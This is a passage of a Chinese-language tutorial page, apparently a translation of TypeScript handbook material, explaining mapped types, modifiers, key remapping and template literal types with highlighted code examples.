<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">FeatureFlags</span> = &#123;</span><br><span class="line">    <span class="attr">darkMode</span>: <span class="function">() =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">    <span class="attr">newUserProfile</span>: <span class="function">() =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">type FeatureOptions = &#123;</span></span><br><span class="line"><span class="comment">    darkMode: boolean;</span></span><br><span class="line"><span class="comment">    newUserProfile: boolean;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">FeatureOptions</span> = <span class="title class_">OptionsFlags</span>&lt;<span class="title class_">FeatureFlags</span>&gt;;</span><br></pre></td></tr></table></figure>

<h4 id="映射修饰符"><a href="#映射修饰符" class="headerlink" title="映射修饰符"></a>映射修饰符</h4><p>在映射期间可以应用两个额外的修饰符：<code>readonly</code>和<code>?</code>分别影响可变性和可选性。</p>
<p>您可以通过前缀<code>-</code>或<code>+</code>来删除或添加这些修饰符。如果您不添加前缀，则假定为<code>+</code>。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Removes &#x27;readonly&#x27; attributes from a type&#x27;s properties</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">CreateMutable</span>&lt;<span class="title class_">Type</span>&gt; = &#123;</span><br><span class="line">    -<span class="keyword">readonly</span> [<span class="title class_">Property</span> <span class="keyword">in</span> keyof <span class="title class_">Type</span>]: <span class="title class_">Type</span>[<span class="title class_">Property</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">LockedAccount</span> = &#123;</span><br><span class="line">    <span class="keyword">readonly</span> <span class="attr">id</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="keyword">readonly</span> <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  type UnlockedAccount = &#123;</span></span><br><span class="line"><span class="comment">      id: string;</span></span><br><span class="line"><span class="comment">      name: string;</span></span><br><span class="line"><span class="comment">  &#125;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">UnlockedAccount</span> = <span class="title class_">CreateMutable</span>&lt;<span class="title class_">LockedAccount</span>&gt;;</span><br></pre></td></tr></table></figure>

<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Removes &#x27;optional&#x27; attributes from a type&#x27;s properties</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Concrete</span>&lt;<span class="title class_">Type</span>&gt; = &#123;</span><br><span class="line">    [<span class="title class_">Property</span> <span class="keyword">in</span> keyof <span class="title class_">Type</span>]-?: <span class="title class_">Type</span>[<span class="title class_">Property</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">MaybeUser</span> = &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="built_in">string</span>;</span><br><span class="line">    name?: <span class="built_in">string</span>;</span><br><span class="line">    age?: <span class="built_in">number</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">type User = &#123;</span></span><br><span class="line"><span class="comment">    id: string;</span></span><br><span class="line"><span class="comment">    name: string;</span></span><br><span class="line"><span class="comment">    age: number;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">User</span> = <span class="title class_">Concrete</span>&lt;<span class="title class_">MaybeUser</span>&gt;;</span><br></pre></td></tr></table></figure>

<h4 id="键重映射通过as"><a href="#键重映射通过as" class="headerlink" title="键重映射通过as"></a>键重映射通过<code>as</code></h4><p>在 TypeScript 4.1 及更高版本中，您可以使用映射类型中的子句<code>as</code>重新映射映射类型中的键：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">MappedTypeWithNewProperties</span>&lt;<span class="title class_">Type</span>&gt; = &#123;</span><br><span class="line">    [<span class="title class_">Properties</span> <span class="keyword">in</span> keyof <span class="title class_">Type</span> <span class="keyword">as</span> <span class="title class_">NewKeyType</span>]: <span class="title class_">Type</span>[<span class="title class_">Properties</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>您可以利用模板字面量类型等功能从先前的属性名称创建新的属性名称：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Getters</span>&lt;<span class="title class_">Type</span>&gt; = &#123;</span><br><span class="line">    [<span class="title class_">Property</span> <span class="keyword">in</span> keyof <span class="title class_">Type</span> <span class="keyword">as</span> <span class="string">`get<span class="subst">$&#123;Capitalize&lt;<span class="built_in">string</span> &amp; Property&gt;&#125;</span>`</span>]: <span class="function">() =&gt;</span> <span class="title class_">Type</span>[<span class="title class_">Property</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="attr">location</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">type LazyPerson = &#123;</span></span><br><span class="line"><span class="comment">    getName: () =&gt; string;</span></span><br><span class="line"><span class="comment">    getAge: () =&gt; number;</span></span><br><span class="line"><span class="comment">    getLocation: () =&gt; string;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">LazyPerson</span> = <span class="title class_">Getters</span>&lt;<span class="title class_">Person</span>&gt;;</span><br></pre></td></tr></table></figure>

<p>您可以通过条件类型生成<code>never</code>来过滤掉键：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Remove the &#x27;kind&#x27; property</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">RemoveKindField</span>&lt;<span class="title class_">Type</span>&gt; = &#123;</span><br><span class="line">    [<span class="title class_">Property</span> <span class="keyword">in</span> keyof <span class="title class_">Type</span> <span class="keyword">as</span> <span class="title class_">Exclude</span>&lt;<span class="title class_">Property</span>, <span class="string">&quot;kind&quot;</span>&gt;]: <span class="title class_">Type</span>[<span class="title class_">Property</span>]</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Circle</span> &#123;</span><br><span class="line">    <span class="attr">kind</span>: <span class="string">&quot;circle&quot;</span>;</span><br><span class="line">    <span class="attr">radius</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">type KindlessCircle = &#123;</span></span><br><span class="line"><span class="comment">    radius: number;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">KindlessCircle</span> = <span class="title class_">RemoveKindField</span>&lt;<span class="title class_">Circle</span>&gt;;</span><br></pre></td></tr></table></figure>

<p>您可以映射任意联合，不仅<code>string | number | symbol</code> 的联合，还可以是任何类型的联合：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">EventConfig</span>&lt;<span class="title class_">Events</span> <span class="keyword">extends</span> &#123; <span class="attr">kind</span>: <span class="built_in">string</span> &#125;&gt; = &#123;</span><br><span class="line">    [E <span class="keyword">in</span> <span class="title class_">Events</span> <span class="keyword">as</span> E[<span class="string">&quot;kind&quot;</span>]]: <span class="function">(<span class="params">event: E</span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">SquareEvent</span> = &#123; <span class="attr">kind</span>: <span class="string">&quot;square&quot;</span>, <span class="attr">x</span>: <span class="built_in">number</span>, <span class="attr">y</span>: <span class="built_in">number</span> &#125;;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">CircleEvent</span> = &#123; <span class="attr">kind</span>: <span class="string">&quot;circle&quot;</span>, <span class="attr">radius</span>: <span class="built_in">number</span> &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">type Config = &#123;</span></span><br><span class="line"><span class="comment">    square: (event: SquareEvent) =&gt; void;</span></span><br><span class="line"><span class="comment">    circle: (event: CircleEvent) =&gt; void;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Config</span> = <span class="title class_">EventConfig</span>&lt;<span class="title class_">SquareEvent</span> | <span class="title class_">CircleEvent</span>&gt;</span><br></pre></td></tr></table></figure>

<h4 id="进一步探索"><a href="#进一步探索" class="headerlink" title="进一步探索"></a>进一步探索</h4><p>映射类型与此类型操作部分中的其他功能配合得很好，例如，这里是一个使用条件类型的映射类型，它返回 <code>true</code>或<code>false</code>取决于对象是否将属性<code>pii</code>设置为字面意义上的<code>true</code>：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">ExtractPII</span>&lt;<span class="title class_">Type</span>&gt; = &#123;</span><br><span class="line">  [<span class="title class_">Property</span> <span class="keyword">in</span> keyof <span class="title class_">Type</span>]: <span class="title class_">Type</span>[<span class="title class_">Property</span>] <span class="keyword">extends</span> &#123; <span class="attr">pii</span>: <span class="literal">true</span> &#125; ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">type</span> <span class="title class_">DBFields</span> = &#123;</span><br><span class="line">  <span class="attr">id</span>: &#123; <span class="attr">format</span>: <span class="string">&quot;incrementing&quot;</span> &#125;;</span><br><span class="line">  <span class="attr">name</span>: &#123; <span class="attr">type</span>: <span class="built_in">string</span>; <span class="attr">pii</span>: <span class="literal">true</span> &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">type ObjectsNeedingGDPRDeletion = &#123;</span></span><br><span class="line"><span class="comment">    id: false;</span></span><br><span class="line"><span class="comment">    name: true;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">ObjectsNeedingGDPRDeletion</span> = <span class="title class_">ExtractPII</span>&lt;<span class="title class_">DBFields</span>&gt;;</span><br></pre></td></tr></table></figure>

<h3 id="模板文字类型"><a href="#模板文字类型" class="headerlink" title="模板文字类型"></a>模板文字类型</h3><p>模板字面量类型建立在字符串字面量类型之上，并且能够通过联合扩展为多个字符串。</p>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals">它们与 JavaScript 中的模板文字字符串</a>具有相同的语法，但用于类型位置。当与具体文字类型一起使用时，模板文字通过连接内容生成新的字符串文字类型。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">World</span> = <span class="string">&quot;world&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Greeting</span> = <span class="string">`hello <span class="subst">$&#123;World&#125;</span>`</span>; <span class="comment">// type Greeting = &quot;hello world&quot;</span></span><br></pre></td></tr></table></figure>

<p>当在插值位置使用联合时，类型是每个联合成员可以表示的每个可能字符串文字的集合：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">EmailLocaleIDs</span> = <span class="string">&quot;welcome_email&quot;</span> | <span class="string">&quot;email_heading&quot;</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">FooterLocaleIDs</span> = <span class="string">&quot;footer_title&quot;</span> | <span class="string">&quot;footer_sendoff&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">type</span> <span class="title class_">AllLocaleIDs</span> = <span class="string">`<span class="subst">$&#123;EmailLocaleIDs | FooterLocaleIDs&#125;</span>_id`</span>; <span class="comment">// type AllLocaleIDs = &quot;welcome_email_id&quot; | &quot;email_heading_id&quot; | &quot;footer_title_id&quot; | &quot;footer_sendoff_id&quot;</span></span><br></pre></td></tr></table></figure>

<p>对于模板字面量中的每个插值位置，并集交叉相乘：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">AllLocaleIDs</span> = <span class="string">`<span class="subst">$&#123;EmailLocaleIDs | FooterLocaleIDs&#125;</span>_id`</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Lang</span> = <span class="string">&quot;en&quot;</span> | <span class="string">&quot;ja&quot;</span> | <span class="string">&quot;pt&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">type</span> <span class="title class_">LocaleMessageIDs</span> = <span class="string">`<span class="subst">$&#123;Lang&#125;</span>_<span class="subst">$&#123;AllLocaleIDs&#125;</span>`</span>; <span class="comment">// type LocaleMessageIDs = &quot;en_welcome_email_id&quot; | &quot;en_email_heading_id&quot; | &quot;en_footer_title_id&quot; | &quot;en_footer_sendoff_id&quot; | &quot;ja_welcome_email_id&quot; | &quot;ja_email_heading_id&quot; | &quot;ja_footer_title_id&quot; | &quot;ja_footer_sendoff_id&quot; | &quot;pt_welcome_email_id&quot; | &quot;pt_email_heading_id&quot; | &quot;pt_footer_title_id&quot; | &quot;pt_footer_sendoff_id&quot;</span></span><br></pre></td></tr></table></figure>

<p>我们通常建议人们对大型字符串联合使用提前生成，但这在较小的情况下很有用。</p>
<h4 id="类型中的字符串联合"><a href="#类型中的字符串联合" class="headerlink" title="类型中的字符串联合"></a>类型中的字符串联合</h4><p>模板字面量类型建立在<a href="https://www.typescriptlang.org/docs/handbook/2/everyday-types.html#literal-types">字符串字面量类型</a>之上，并且能够通过联合扩展为多个字符串。</p>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals">它们与 JavaScript 中的模板文字字符串</a>具有相同的语法，但用于类型位置。当与具体文字类型一起使用时，模板文字通过连接内容生成新的字符串文字类型。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">World</span> = <span class="string">&quot;world&quot;</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Greeting</span> = <span class="string">`hello <span class="subst">$&#123;World&#125;</span>`</span>; <span class="comment">// type Greeting = &quot;hello world&quot;</span></span><br></pre></td></tr></table></figure>

<p>当在插值位置使用联合时，类型是每个联合成员可以表示的每个可能字符串文字的集合：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">EmailLocaleIDs</span> = <span class="string">&quot;welcome_email&quot;</span> | <span class="string">&quot;email_heading&quot;</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">FooterLocaleIDs</span> = <span class="string">&quot;footer_title&quot;</span> | <span class="string">&quot;footer_sendoff&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// type AllLocaleIDs = &quot;welcome_email_id&quot; | &quot;email_heading_id&quot; | &quot;footer_title_id&quot; | &quot;footer_sendoff_id&quot;</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">AllLocaleIDs</span> = <span class="string">`<span class="subst">$&#123;EmailLocaleIDs | FooterLocaleIDs&#125;</span>_id`</span>;</span><br></pre></td></tr></table></figure>

<p>对于模板字面量中的每个插值位置，<strong>并集交叉相乘</strong>：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">AllLocaleIDs</span> = <span class="string">`<span class="subst">$&#123;EmailLocaleIDs | FooterLocaleIDs&#125;</span>_id`</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Lang</span> = <span class="string">&quot;en&quot;</span> | <span class="string">&quot;ja&quot;</span> | <span class="string">&quot;pt&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// type LocaleMessageIDs = &quot;en_welcome_email_id&quot; | &quot;en_email_heading_id&quot; | &quot;en_footer_title_id&quot; | &quot;en_footer_sendoff_id&quot; | &quot;ja_welcome_email_id&quot; | &quot;ja_email_heading_id&quot; | &quot;ja_footer_title_id&quot; | &quot;ja_footer_sendoff_id&quot; | &quot;pt_welcome_email_id&quot; | &quot;pt_email_heading_id&quot; | &quot;pt_footer_title_id&quot; | &quot;pt_footer_sendoff_id&quot;</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">LocaleMessageIDs</span> = <span class="string">`<span class="subst">$&#123;Lang&#125;</span>_<span class="subst">$&#123;AllLocaleIDs&#125;</span>`</span>;</span><br></pre></td></tr></table></figure>

<p>我们通常建议人们对大型字符串联合使用提前生成，但这在较小的情况下很有用。</p>
<h4 id="类型中的字符串联合-1"><a href="#类型中的字符串联合-1" class="headerlink" title="类型中的字符串联合"></a>类型中的字符串联合</h4><p>当基于类型中的信息定义新字符串时，模板字面量的威力就体现出来了。</p>
<p>考虑这样一种情况，函数 ( <code>makeWatchedObject</code>) 添加一个新函数<code>on()</code>调用给传递的对象。在 JavaScript 中，它的调用可能如下所示 <code>makeWatchedObject(baseObject)</code>：我们可以想象基础对象看起来像：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> passedObject = &#123;</span><br><span class="line">  firstName = <span class="string">&quot;Saoirse&quot;</span>,</span><br><span class="line">  lastName = <span class="string">&quot;Ronan&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">26</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>on</code>将添加到基础对象的函数需要两个参数，一个 <code>eventName</code>(a <code>string</code>) 和一个<code>callBack</code>(a <code>function</code>)。</p>
<p>这个<code>eventName</code>应该是<code>attributeInThePassedObject + &quot;Changed&quot;</code>; 因此，<code>firstNameChanged</code>从基础对象中的<code>firstName</code>属性派生。</p>
<p>该<code>callBack</code>函数在调用时：</p>
<ul>
<li>应传递与名称关联的类型的值<code>attributeInThePassedObject</code>；因此，由于<code>firstName</code>类型为<code>string</code>，事件的回调<code>firstNameChanged</code>期望在调用时将 a<code>string</code>传递给它。类似地，与关联的事件<code>age</code>应该期望用<code>number</code>参数调用</li>
<li>应该有<code>void</code>返回类型（为了演示的简单性）</li>
</ul>
<p>因此， 的原始函数签名<code>on()</code>可能是：<code>on(eventName: string, callBack: (newValue: any) =&gt; void)</code>。但是，在前面的描述中，我们确定了我们希望在代码中记录的重要类型约束。模板文字类型让我们将这些约束带入我们的代码中。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> person = <span class="title function_">makeWatchedObject</span>(&#123;</span><br><span class="line">  <span class="attr">firstName</span>: <span class="string">&quot;Saoirse&quot;</span>,</span><br><span class="line">  <span class="attr">lastName</span>: <span class="string">&quot;Ronan&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">26</span>,</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// makeWatchedObject has added `on` to the anonymous Object</span></span><br><span class="line"> </span><br><span class="line">person.<span class="title function_">on</span>(<span class="string">&quot;firstNameChanged&quot;</span>, <span class="function">(<span class="params">newValue</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`firstName was changed to <span class="subst">$&#123;newValue&#125;</span>!`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>请注意，<code>on</code>监听事件<code>&quot;firstNameChanged&quot;</code>，而不仅仅是<code>&quot;firstName&quot;</code>. <code>on()</code>如果我们要确保符合条件的事件名称集受监视对象中属性名称的联合约束，并在末尾添加“已更改”，我们的天真规范可能会变得更加健壮。虽然我们很乐意在 JavaScript ie 中进行这样的计算<code>Object.keys(passedObject).map(x =&gt;</code>${x}Changed<code>)</code>，但<em>类型系统中的</em>模板文字提供了类似的字符串操作方法：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">PropEventSource</span>&lt;<span class="title class_">Type</span>&gt; = &#123;</span><br><span class="line">    <span class="title function_">on</span>(<span class="attr">eventName</span>: <span class="string">`<span class="subst">$&#123;<span class="built_in">string</span> &amp; keyof Type&#125;</span>Changed`</span>, <span class="attr">callback</span>: <span class="function">(<span class="params">newValue: <span class="built_in">any</span></span>) =&gt;</span> <span class="built_in">void</span>): <span class="built_in">void</span>;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/// Create a &quot;watched object&quot; with an &#x27;on&#x27; method</span></span><br><span class="line"><span class="comment">/// so that you can watch for changes to properties.</span></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">function</span> makeWatchedObject&lt;<span class="title class_">Type</span>&gt;(<span class="attr">obj</span>: <span class="title class_">Type</span>): <span class="title class_">Type</span> &amp; <span class="title class_">PropEventSource</span>&lt;<span class="title class_">Type</span>&gt;;</span><br></pre></td></tr></table></figure>

<p>有了这个，我们可以构建一些在给定错误属性时出错的东西：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> person = <span class="title function_">makeWatchedObject</span>(&#123;</span><br><span class="line">  <span class="attr">firstName</span>: <span class="string">&quot;Saoirse&quot;</span>,</span><br><span class="line">  <span class="attr">lastName</span>: <span class="string">&quot;Ronan&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">26</span></span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">person.<span class="title function_">on</span>(<span class="string">&quot;firstNameChanged&quot;</span>, <span class="function">() =&gt;</span> &#123;&#125;);</span><br><span class="line"><span class="comment">// Prevent easy human error (using the key instead of the event name)</span></span><br><span class="line">person.<span class="title function_">on</span>(<span class="string">&quot;firstName&quot;</span>, <span class="function">() =&gt;</span> &#123;&#125;); <span class="comment">// error Argument of type &#x27;&quot;firstName&quot;&#x27; is not assignable to parameter of type &#x27;&quot;firstNameChanged&quot; | &quot;lastNameChanged&quot; | &quot;ageChanged&quot;&#x27;.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// It&#x27;s typo-resistant</span></span><br><span class="line">person.<span class="title function_">on</span>(<span class="string">&quot;frstNameChanged&quot;</span>, <span class="function">() =&gt;</span> &#123;&#125;); <span class="comment">// error Argument of type &#x27;&quot;frstNameChanged&quot;&#x27; is not assignable to parameter of type &#x27;&quot;firstNameChanged&quot; | &quot;lastNameChanged&quot; | &quot;ageChanged&quot;&#x27;.</span></span><br></pre></td></tr></table></figure>

<h4 id="用模板文字推断"><a href="#用模板文字推断" class="headerlink" title="用模板文字推断"></a>用模板文字推断</h4><p>请注意，我们并未受益于原始传递对象中提供的所有信息。给定 a 的变化<code>firstName</code>（即<code>firstNameChanged</code>事件），我们应该期望回调将接收 type <code>string</code>的参数。同样，更改为的回调<code>age</code>应该接收一个<code>number</code>参数。我们天真地使用<code>any</code>to type the<code>callBack</code>的参数。同样，模板文字类型可以确保属性的数据类型与该属性的回调的第一个参数的类型相同。</p>
<p>使这成为可能的关键见解是：我们可以使用具有泛型的函数，这样：</p>
<ol>
<li>第一个参数中使用的文字被捕获为文字类型</li>
<li>该文字类型可以被验证为在泛型中的有效属性的联合中</li>
<li>可以使用索引访问在泛型的结构中查找经过验证的属性的类型</li>
<li><em>然后</em>可以应用此类型信息以确保回调函数的参数属于同一类型</li>
</ol>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">PropEventSource</span>&lt;<span class="title class_">Type</span>&gt; = &#123;</span><br><span class="line">    on&lt;<span class="title class_">Key</span> <span class="keyword">extends</span> <span class="built_in">string</span> &amp; keyof <span class="title class_">Type</span>&gt;</span><br><span class="line">        (<span class="attr">eventName</span>: <span class="string">`<span class="subst">$&#123;Key&#125;</span>Changed`</span>, <span class="attr">callback</span>: <span class="function">(<span class="params">newValue: Type[Key]</span>) =&gt;</span> <span class="built_in">void</span> ): <span class="built_in">void</span>;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">function</span> makeWatchedObject&lt;<span class="title class_">Type</span>&gt;(<span class="attr">obj</span>: <span class="title class_">Type</span>): <span class="title class_">Type</span> &amp; <span class="title class_">PropEventSource</span>&lt;<span class="title class_">Type</span>&gt;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> person = <span class="title function_">makeWatchedObject</span>(&#123;</span><br><span class="line">  <span class="attr">firstName</span>: <span class="string">&quot;Saoirse&quot;</span>,</span><br><span class="line">  <span class="attr">lastName</span>: <span class="string">&quot;Ronan&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">26</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">person.<span class="title function_">on</span>(<span class="string">&quot;firstNameChanged&quot;</span>, <span class="function"><span class="params">newName</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// (parameter) newName: string</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`new name is <span class="subst">$&#123;newName.toUpperCase()&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line">person.<span class="title function_">on</span>(<span class="string">&quot;ageChanged&quot;</span>, <span class="function"><span class="params">newAge</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// (parameter) newAge: number</span></span><br><span class="line">  <span class="keyword">if</span> (newAge &lt; <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;warning! negative age&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们制作成<code>on</code>泛型方法。</p>
<p>当用户使用字符串调用时<code>&quot;firstNameChanged&quot;</code>，TypeScript 将尝试为 推断正确的类型<code>Key</code>。为此，它将匹配<code>Key</code>之前的内容<code>&quot;Changed&quot;</code>并推断字符串<code>&quot;firstName&quot;</code>。一旦 TypeScript 弄清楚了这一点，该方法就可以获取原始对象的<code>on</code>类型，在本例中就是这样。同样，当使用调用时，TypeScript 会找到属性的类型。<code>firstName``string``&quot;ageChanged&quot;``age``number</code></p>
<p>推理可以以不同的方式组合，通常是解构字符串，并以不同的方式重建它们。</p>
<h4 id="内部字符串操作类型"><a href="#内部字符串操作类型" class="headerlink" title="内部字符串操作类型"></a>内部字符串操作类型</h4><p>为了帮助进行字符串操作，TypeScript 包含一组可用于字符串操作的类型。这些类型内置于编译器中以提高性能，并且无法在TypeScript 附带的文件<code>.d.ts</code>中找到。</p>
<p><strong>Uppercase<StringType></strong></p>
<p>将字符串中的每个字符转换为大写版本。</p>
<p>例子</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Greeting</span> = <span class="string">&quot;Hello, world&quot;</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">ShoutyGreeting</span> = <span class="title class_">Uppercase</span>&lt;<span class="title class_">Greeting</span>&gt; <span class="comment">// type ShoutyGreeting = &quot;HELLO, WORLD&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">ASCIICacheKey</span>&lt;<span class="title class_">Str</span> <span class="keyword">extends</span> <span class="built_in">string</span>&gt; = <span class="string">`ID-<span class="subst">$&#123;Uppercase&lt;Str&gt;&#125;</span>`</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">MainID</span> = <span class="title class_">ASCIICacheKey</span>&lt;<span class="string">&quot;my_app&quot;</span>&gt; <span class="comment">// type MainID = &quot;ID-MY_APP&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>Lowercase<StringType></strong></p>
<p>将字符串中的每个字符转换为等效的小写字母。</p>
<p>例子</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Greeting</span> = <span class="string">&quot;Hello, world&quot;</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">QuietGreeting</span> = <span class="title class_">Lowercase</span>&lt;<span class="title class_">Greeting</span>&gt; <span class="comment">// type QuietGreeting = &quot;hello, world&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">ASCIICacheKey</span>&lt;<span class="title class_">Str</span> <span class="keyword">extends</span> <span class="built_in">string</span>&gt; = <span class="string">`id-<span class="subst">$&#123;Lowercase&lt;Str&gt;&#125;</span>`</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">MainID</span> = <span class="title class_">ASCIICacheKey</span>&lt;<span class="string">&quot;MY_APP&quot;</span>&gt; <span class="comment">// type MainID = &quot;id-my_app&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>Capitalize<StringType></strong></p>
<p>将字符串中的第一个字符转换为等效的大写字母。</p>
<p>例子</p>
